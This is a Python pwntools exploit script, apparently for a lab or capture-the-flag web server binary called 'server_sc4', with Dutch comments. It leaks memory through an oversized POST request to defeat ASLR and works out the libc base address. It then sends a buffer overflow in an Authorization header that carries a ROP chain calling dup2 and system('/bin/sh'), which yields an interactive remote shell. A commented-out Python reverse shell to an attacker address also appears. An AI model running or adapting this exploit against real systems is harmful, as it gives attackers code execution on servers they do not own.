import pwn

TARGET = "192.168.0.226"
TARGET_PORT = 8080

# setup binary and libc
libc = pwn.ELF("./libc.so.6")
elf = pwn.context.binary = pwn.ELF("server_sc4")
pwn.context.encoding = 'latin1'

formaat = b"== Request from " + b"A" * 15 + b" at fd " + b"A" * 10 + b"\n"
log_buffer_rbp_offset = 0x450
post_size = 666666
leak_file = "data.txt"

#### Ret2lib offsets ####

# handle: 0x3720
handle_offset_after = "72000" # na deze offset komt handle
# clone: 0xfba30
clone_offset_after = "a6f00"  # na deze offset komt clone

def make_get_request(file):
  return f"GET /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 0\r\n\r\n".encode()

def make_evil_get_request(file):
  return f"GET /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: 1337\r\nAuthorization: Basic%s\r\n\r\n".encode()

def make_post_request(file, content_length, data):
  return f"POST /{file} HTTP/1.1\r\nHost: {TARGET}:{TARGET_PORT}\r\nUser-Agent: curl/8.4.0\r\nAccept: */*\r\nContent-Type: text/plain\r\nContent-Length: {content_length}\r\n\r\n{data}".encode()

def make_new_connection(io=None):
  if io is not None:
    io.close()
  return pwn.remote(TARGET, TARGET_PORT)

if __name__.__eq__("__main__"):
  io = make_new_connection()

  # send generic request to get data.txt
  t = make_get_request(leak_file)
  io.send(t)
  res1 = io.recvall(timeout=3)

  io = make_new_connection(io)
  # Send POST met post_size als content length
  post_request = make_post_request(leak_file, post_size, "")
  io.send(post_request)
  io.recvall(timeout=3)

  # Send GET for leaked data
  io = make_new_connection()
  get_request = make_get_request(leak_file)
  io.send(get_request)
  # Skip garbage
  io.recvuntil(b"\r\n\r\n")
  io.recvuntil(b"hurt you")
  # Fix for varying ip lengths
  if len(TARGET) > 9:
    io.recv(len(TARGET) - 9)
  leak = io.recvall(timeout=3)

  adres = b""
  handle_aslr = None
  for b in range(len(leak) // 8):
    adres = leak[b * 8:b * 8 + 8]
    try:
      print("adres: " + adres.decode())
    except UnicodeDecodeError:
      print("adres: " + hex(pwn.u64(adres)))
      # Om base adres van ELF te vinden
      if handle_offset_after in hex(pwn.u64(adres)):
        if handle_aslr is None:
          handle_aslr = pwn.u64(bytes.fromhex(hex(pwn.u64(adres))[:-2][2:])[::-1] + b"\x00\x00")
      # Om het base adres van libc te vinden
      if clone_offset_after in hex(pwn.u64(adres)):
        clone_aslr = adres
        break

  # Fix base adres van ELF. Dit update alle symbols.
  elf.address = handle_aslr - elf.sym.handle
  print(f"Leaked binary base adres: {hex(elf.address)}")

  # Fix base adres van libc. Dit update alle symbols.
  print(hex(libc.sym.clone + 63))
  libc_offset_adres = libc.sym.clone + 63
  libc.address = (pwn.u64(clone_aslr[1:] + b"\x00")) - libc_offset_adres
  print(f"libc.so.6 base adres: {hex(libc.address)}")


  #### ROP CHAIN ####
  io = make_new_connection(io)
  rop = pwn.ROP(libc)

  binsh = next(libc.search(b"/bin/sh"))

  g1 = pwn.p64(rop.find_gadget(["pop rdi", "ret"])[0])
  g2 = pwn.p64(rop.find_gadget(["pop rsi", "ret"])[0])
  g3 = pwn.p64(rop.find_gadget(["pop rdx", "ret"])[0])

  # import socket, subprocess, os;
  #
  # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  # s.connect(("<my ip address>", 2375));
  # os.dup2(s.fileno(), 0);
  # os.dup2(s.fileno(), 1);
  # os.dup2(s.fileno(), 2);
  # p = subprocess.call(["/bin/sh", "-i"]);

  # payload om een reverse shell te spawnen
  payload = [
    g1, pwn.p64(5),
    g2, pwn.p64(0),
    pwn.p64(libc.sym.dup2),
    g1, pwn.p64(5),
    g2, pwn.p64(1),
    pwn.p64(libc.sym.dup2),
    g1, pwn.p64(5),
    g2, pwn.p64(2),
    pwn.p64(libc.sym.dup2),
    g1, pwn.p64(binsh),
    g2, pwn.p64(binsh),
    g3, pwn.p64(0),
    pwn.p64(libc.sym.system)
  ]

  ### PERFORM ATTACK ###
  sc4_exploit = make_evil_get_request(leak_file)
  padding_size = ((((log_buffer_rbp_offset + 8) - len(formaat)) - (len(sc4_exploit) - 6)))
  sc4_exploit = sc4_exploit.replace(b"%s", b"A" * padding_size + b"".join(payload))

  io.send(sc4_exploit)
  io.interactive()

